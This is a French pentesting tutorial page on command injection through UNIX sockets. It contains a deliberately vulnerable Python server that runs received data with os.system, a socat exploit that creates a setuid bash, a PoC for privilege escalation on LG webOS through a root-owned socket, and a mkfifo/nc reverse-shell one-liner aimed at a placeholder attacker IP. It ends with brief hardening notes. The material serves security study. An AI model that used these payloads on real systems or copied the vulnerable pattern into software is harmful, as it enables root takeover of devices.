# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Exemple de Socket binding avec Python

Dans l'exemple suivant, un **unix socket est créé** (`/tmp/socket_test.s`) et tout ce qui est **reçu** sera **exécuté** par `os.system`. Je sais que vous n'allez pas trouver ça dans la nature, mais l'objectif de cet exemple est de montrer à quoi ressemble un code utilisant des unix sockets et comment gérer l'entrée dans le pire des cas.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Exécutez** le code avec python : `python s.py` et **vérifiez comment le socket est en écoute** :
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Étude de cas : Root-owned UNIX socket signal-triggered escalation (LG webOS)

Certains daemons privilégiés exposent un root-owned UNIX socket qui accepte des entrées non fiables et associe des actions privilégiées à des thread-IDs et des signals. Si le protocole permet à un unprivileged client d'influencer quel native thread est ciblé, vous pouvez peut-être déclencher un chemin de code privilégié et escalader.

Observed pattern:
- Se connecter à un root-owned socket (e.g., /tmp/remotelogger).
- Créer un thread et obtenir son native thread id (TID).
- Envoyer le TID (packed) plus du padding en tant que requête ; recevoir un accusé de réception.
- Envoyer un signal spécifique à ce TID pour déclencher le comportement privilégié.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Pour transformer cela en root shell, un simple schéma named-pipe + nc peut être utilisé :
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes :
- Cette classe de bugs provient du fait de faire confiance à des valeurs dérivées de l'état client non privilégié (TIDs) et de les lier à des gestionnaires de signaux ou à de la logique privilégiée.
- Durcir en appliquant des credentials sur la socket, en validant les formats de message, et en découplant les opérations privilégiées des thread identifiers fournis depuis l'extérieur.

## Références

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
